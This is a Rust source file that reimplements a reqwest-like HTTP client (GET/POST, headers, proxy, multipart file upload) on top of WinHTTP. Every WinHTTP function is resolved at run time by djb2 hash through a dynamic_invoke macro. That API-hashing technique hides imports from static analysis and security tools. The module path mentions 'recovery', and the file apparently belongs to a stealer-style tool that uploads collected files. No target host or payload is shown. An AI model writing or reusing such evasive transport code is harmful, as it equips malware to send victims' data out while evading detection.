use std::ffi::c_void;
use std::ptr::{null, null_mut};
use std::time::Duration;
use serde::{Serialize, de::DeserializeOwned};
use crate::dynamic_invoke;
use crate::recovery::helpers::dynamic_api::{djb2_hash, WINHTTP_HASH};
use windows_sys::Win32::Foundation::GetLastError;

#[derive(Debug, thiserror::Error)]
pub enum Error {
    #[error("WinHttp error: {0}")]
    WinHttp(u32),
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("JSON error: {0}")]
    Json(#[from] serde_json::Error),
    #[error("UTF8 error: {0}")]
    Utf8(#[from] std::string::FromUtf8Error),
    #[error("Status code: {0}")]
    #[allow(dead_code)]
    Status(u32),
    #[error("Url parse error")]
    UrlParse,
}

#[derive(Clone, Debug)]
pub struct Client {
    proxy: Option<String>,
    user_agent: String,
}

impl Client {
    pub fn new() -> Self {
        Self::builder().build().unwrap()
    }

    pub fn builder() -> ClientBuilder {
        ClientBuilder::default()
    }

    pub fn post(&self, url: impl Into<String>) -> RequestBuilder {
        RequestBuilder::new(self.clone(), Method::Post, url)
    }

    pub fn get(&self, url: impl Into<String>) -> RequestBuilder {
        RequestBuilder::new(self.clone(), Method::Get, url)
    }
}

#[derive(Default)]
pub struct ClientBuilder {
    proxy: Option<String>,
    user_agent: Option<String>,
}

impl ClientBuilder {
    pub fn proxy(mut self, proxy: Proxy) -> Self {
        self.proxy = Some(proxy.url);
        self
    }

    pub fn user_agent(mut self, ua: impl Into<String>) -> Self {
        self.user_agent = Some(ua.into());
        self
    }

    pub fn timeout(self, _duration: Duration) -> Self {
        self
    }

    pub fn default_headers(mut self, headers: HeaderMap) -> Self {
        if let Some(ua) = headers.get("User-Agent") {
            self.user_agent = Some(ua.to_string());
        }
        self
    }

    pub fn build(self) -> Result<Client, Error> {
        Ok(Client {
            proxy: self.proxy,
            user_agent: self.user_agent.unwrap_or_else(|| "Mozilla/5.0".to_string()),
        })
    }
}

pub struct Proxy {
    url: String,
}

impl Proxy {
    pub fn all(url: impl Into<String>) -> Result<Self, Error> {
        Ok(Self { url: url.into() })
    }
}

pub struct HeaderMap {
    headers: std::collections::HashMap<String, String>,
}

impl HeaderMap {
    pub fn new() -> Self {
        Self { headers: std::collections::HashMap::new() }
    }
    
    pub fn insert(&mut self, key: &str, value: HeaderValue) {
        self.headers.insert(key.to_string(), value.0);
    }
    
    pub fn get(&self, key: &str) -> Option<&String> {
        self.headers.get(key)
    }
}

pub struct HeaderValue(String);
impl HeaderValue {
    pub fn from_static(s: &str) -> Self {
        Self(s.to_string())
    }
}

pub const USER_AGENT: &str = "User-Agent";

#[derive(Debug, Clone, Copy)]
pub enum Method {
    Get,
    Post,
}

pub struct RequestBuilder {
    client: Client,
    method: Method,
    url: String,
    headers: std::collections::HashMap<String, String>,
    body: Vec<u8>,
}

impl RequestBuilder {
    pub fn new(client: Client, method: Method, url: impl Into<String>) -> Self {
        Self {
            client,
            method,
            url: url.into(),
            headers: std::collections::HashMap::new(),
            body: Vec::new(),
        }
    }

    pub fn header(mut self, key: impl Into<String>, value: impl Into<String>) -> Self {
        self.headers.insert(key.into(), value.into());
        self
    }

    pub fn body(mut self, body: impl Into<Vec<u8>>) -> Self {
        self.body = body.into();
        self
    }

    #[allow(dead_code)]
    pub fn json<T: Serialize>(mut self, json: &T) -> Self {
        if let Ok(body) = serde_json::to_vec(json) {
            self.body = body;
            self.headers.insert("Content-Type".to_string(), "application/json".to_string());
        }
        self
    }

    pub fn multipart(mut self, form: Form) -> Self {
        self.body = form.body;
        let closing = format!("--{}--\r\n", form.boundary);
        self.body.extend_from_slice(closing.as_bytes());
        self.headers.insert("Content-Type".to_string(), format!("multipart/form-data; boundary={}", form.boundary));
        self
    }

    pub async fn send(self) -> Result<Response, Error> {
        let client = self.client.clone();
        let method = self.method;
        let url = self.url.clone();
        let headers = self.headers.clone();
        let body = self.body.clone();

        tokio::task::spawn_blocking(move || {
            send_request_sync(client, method, url, headers, body)
        }).await.map_err(|e| Error::Io(std::io::Error::new(std::io::ErrorKind::Other, e)))?
    }
}

pub struct Response {
    status: u32,
    body: Vec<u8>,
}

impl Response {
    pub fn status(&self) -> StatusCode {
        StatusCode(self.status)
    }

    pub async fn json<T: DeserializeOwned>(self) -> Result<T, Error> {
        serde_json::from_slice(&self.body).map_err(Error::Json)
    }
    
    pub async fn text(self) -> Result<String, Error> {
        String::from_utf8(self.body).map_err(Error::Utf8)
    }

    pub async fn bytes(self) -> Result<Vec<u8>, Error> {
        Ok(self.body)
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct StatusCode(u32);
impl StatusCode {
    pub const OK: StatusCode = StatusCode(200);
    pub const UNAUTHORIZED: StatusCode = StatusCode(401);

    pub fn is_success(&self) -> bool {
        self.0 >= 200 && self.0 < 300
    }
}

impl std::fmt::Display for StatusCode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

pub struct Form {
    boundary: String,
    body: Vec<u8>,
}

impl Form {
    pub fn new() -> Self {
        let boundary = format!("------------------------{}", uuid::Uuid::new_v4().simple());
        Self {
            boundary,
            body: Vec::new(),
        }
    }

    pub fn text(mut self, key: &str, value: String) -> Self {
        let part = format!(
            "--{}\r\nContent-Disposition: form-data; name=\"{}\"\r\n\r\n{}\r\n",
            self.boundary, key, value,
        );
        self.body.extend_from_slice(part.as_bytes());
        self
    }

    pub fn part(mut self, key: &str, part: Part) -> Self {
        let head = format!(
            "--{}\r\nContent-Disposition: form-data; name=\"{}\"; filename=\"{}\"\r\nContent-Type: application/octet-stream\r\n\r\n",
            self.boundary, key, part.file_name,
        );
        self.body.extend_from_slice(head.as_bytes());
        self.body.extend_from_slice(&part.bytes);
        self.body.extend_from_slice(b"\r\n");
        self
    }
}

pub struct Part {
    bytes: Vec<u8>,
    file_name: String,
}

impl Part {
    pub fn bytes(bytes: Vec<u8>) -> Self {
        Self {
            bytes,
            file_name: "file".to_string(),
        }
    }

    pub fn file_name(mut self, name: String) -> Self {
        self.file_name = name;
        self
    }
}

const WINHTTP_ACCESS_TYPE_NO_PROXY: u32 = 1;
const WINHTTP_ACCESS_TYPE_NAMED_PROXY: u32 = 3;
const WINHTTP_ADDREQ_FLAG_ADD: u32 = 0x20000000;
const WINHTTP_ADDREQ_FLAG_REPLACE: u32 = 0x80000000;
const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x20000000;

fn to_utf16(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// Low-level WinHTTP Wrapper
fn send_request_sync(
    client: Client,
    method: Method,
    url_str: String,
    headers: std::collections::HashMap<String, String>,
    body: Vec<u8>,
) -> Result<Response, Error> {
    unsafe {
        let url_parts = url_str.splitn(4, '/').collect::<Vec<&str>>(); 
        
        if url_parts.len() < 3 {
            return Err(Error::UrlParse);
        }
        
        let scheme = url_parts[0];
        let host_port = url_parts[2];
        let path = if url_parts.len() > 3 {
            format!("/{}", url_parts[3..].join("/"))
        } else {
            "/".to_string()
        };

        let (host, port) = if let Some(idx) = host_port.find(':') {
            (
                &host_port[..idx], 
                host_port[idx+1..].parse::<u16>().unwrap_or(if scheme == "https:" { 443 } else { 80 })
            )
        } else {
            (host_port, if scheme == "https:" { 443 } else { 80 })
        };
        
        let h_user_agent = to_utf16(&client.user_agent);
        let proxy_type = if client.proxy.is_some() { WINHTTP_ACCESS_TYPE_NAMED_PROXY } else { WINHTTP_ACCESS_TYPE_NO_PROXY };
        let proxy_name = client.proxy.as_ref().map(|s| to_utf16(s)).unwrap_or_default();

        type FnWinHttpOpen = unsafe extern "system" fn(
            psz_user_agent: *const u16,
            dw_access_type: u32,
            psz_proxy_w: *const u16,
            psz_proxy_bypass_w: *const u16,
            dw_flags: u32,
        ) -> *mut c_void;

        let h_session = dynamic_invoke!(
            WINHTTP_HASH,
            djb2_hash("WinHttpOpen"),
            FnWinHttpOpen,
            h_user_agent.as_ptr(),
            proxy_type,
            if client.proxy.is_some() { proxy_name.as_ptr() } else { null() },
            null(),
            0
        ).unwrap_or(null_mut());

        if h_session.is_null() {
            return Err(Error::WinHttp(GetLastError()));
        }

        type FnWinHttpConnect = unsafe extern "system" fn(
            h_session: *const c_void,
            pswz_server_name: *const u16,
            n_server_port: u16,
            dw_reserved: u32,
        ) -> *mut c_void;

        let h_host = to_utf16(host);
        let h_connect = dynamic_invoke!(
            WINHTTP_HASH,
            djb2_hash("WinHttpConnect"),
            FnWinHttpConnect,
            h_session,
            h_host.as_ptr(),
            port,
            0
        ).unwrap_or(null_mut());

        type FnWinHttpCloseHandle = unsafe extern "system" fn(h_internet: *const c_void) -> i32;

        if h_connect.is_null() {
            let err = GetLastError();
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
            return Err(Error::WinHttp(err));
        }

        let method_str = match method {
            Method::Get => "GET",
            Method::Post => "POST",
        };

        let flags = if scheme == "https:" { WINHTTP_FLAG_SECURE } else { 0 };

        type FnWinHttpOpenRequest = unsafe extern "system" fn(
            h_connect: *const c_void,
            pwsz_verb: *const u16,
            pwsz_object_name: *const u16,
            pwsz_version: *const u16,
            pwsz_referrer: *const u16,
            ppwsz_accept_types: *const *const u16,
            dw_flags: u32,
        ) -> *mut c_void;

        let h_method = to_utf16(method_str);
        let h_path = to_utf16(&path);

        let h_request = dynamic_invoke!(
            WINHTTP_HASH,
            djb2_hash("WinHttpOpenRequest"),
            FnWinHttpOpenRequest,
            h_connect,
            h_method.as_ptr(),
            h_path.as_ptr(),
            null(),
            null(),
            null(),
            flags
        ).unwrap_or(null_mut());

        if h_request.is_null() {
            let err = GetLastError();
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
            return Err(Error::WinHttp(err));
        }

        type FnWinHttpAddRequestHeaders = unsafe extern "system" fn(
            h_request: *const c_void,
            pwsz_headers: *const u16,
            dw_headers_length: u32,
            dw_modifiers: u32,
        ) -> i32;

        // Add Headers
        for (k, v) in headers {
            let header_str = format!("{}: {}", k, v);
            let h_header = to_utf16(&header_str);
            let _ = dynamic_invoke!(
                WINHTTP_HASH,
                djb2_hash("WinHttpAddRequestHeaders"),
                FnWinHttpAddRequestHeaders,
                h_request,
                h_header.as_ptr(),
                u32::MAX, // Autodetect length
                WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
            );
        }

        type FnWinHttpSendRequest = unsafe extern "system" fn(
            h_request: *const c_void,
            pwsz_headers: *const u16,
            dw_headers_length: u32,
            lp_optional: *const c_void,
            dw_optional_length: u32,
            dw_total_length: u32,
            dw_context: usize,
        ) -> i32;

        // Send Request
        let total_bytes = body.len() as u32;
        let p_data = if total_bytes > 0 {
            body.as_ptr() as *const c_void
        } else {
            null()
        };

        let success = dynamic_invoke!(
            WINHTTP_HASH,
            djb2_hash("WinHttpSendRequest"),
            FnWinHttpSendRequest,
            h_request,
            null(),
            0,
            p_data,
            total_bytes,
            total_bytes,
            0
        ).unwrap_or(0);

        if success == 0 {
            let err = GetLastError();
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_request);
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
            return Err(Error::WinHttp(err));
        }

        type FnWinHttpReceiveResponse = unsafe extern "system" fn(h_request: *const c_void, lp_reserved: *const c_void) -> i32;

        if dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpReceiveResponse"), FnWinHttpReceiveResponse, h_request, null_mut()).unwrap_or(0) == 0 {
            let err = GetLastError();
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_request);
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
            dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);
            return Err(Error::WinHttp(err));
        }

        type FnWinHttpQueryHeaders = unsafe extern "system" fn(
            h_request: *const c_void,
            dw_info_level: u32,
            pwsz_name: *const u16,
            lp_buffer: *mut c_void,
            lpdw_buffer_length: *mut u32,
            lpdw_index: *mut u32,
        ) -> i32;

        // Get Status Code
        let mut status_code: u32 = 0;
        let mut size = std::mem::size_of::<u32>() as u32;
        let _ = dynamic_invoke!(
            WINHTTP_HASH,
            djb2_hash("WinHttpQueryHeaders"),
            FnWinHttpQueryHeaders,
            h_request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            null(),
            &mut status_code as *mut _ as *mut c_void,
            &mut size,
            null_mut()
        );

        type FnWinHttpQueryDataAvailable = unsafe extern "system" fn(h_request: *const c_void, lpdw_number_of_bytes_available: *mut u32) -> i32;
        type FnWinHttpReadData = unsafe extern "system" fn(
            h_request: *const c_void,
            lp_buffer: *mut c_void,
            dw_number_of_bytes_to_read: u32,
            lpdw_number_of_bytes_read: *mut u32,
        ) -> i32;

        // Read Body
        let mut response_body = Vec::new();
        loop {
            let mut dw_size: u32 = 0;
            if dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpQueryDataAvailable"), FnWinHttpQueryDataAvailable, h_request, &mut dw_size).unwrap_or(0) == 0 {
                break;
            }
            if dw_size == 0 {
                break;
            }

            let mut buffer = vec![0u8; dw_size as usize];
            let mut downloaded: u32 = 0;
            if dynamic_invoke!(
                WINHTTP_HASH,
                djb2_hash("WinHttpReadData"),
                FnWinHttpReadData,
                h_request,
                buffer.as_mut_ptr() as *mut c_void,
                dw_size,
                &mut downloaded
            ).unwrap_or(0) != 0 {
                buffer.truncate(downloaded as usize);
                response_body.extend(buffer);
            } else {
                break;
            }
        }

        dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_request);
        dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_connect);
        dynamic_invoke!(WINHTTP_HASH, djb2_hash("WinHttpCloseHandle"), FnWinHttpCloseHandle, h_session);

        Ok(Response {
            status: status_code,
            body: response_body,
        })
    }
}
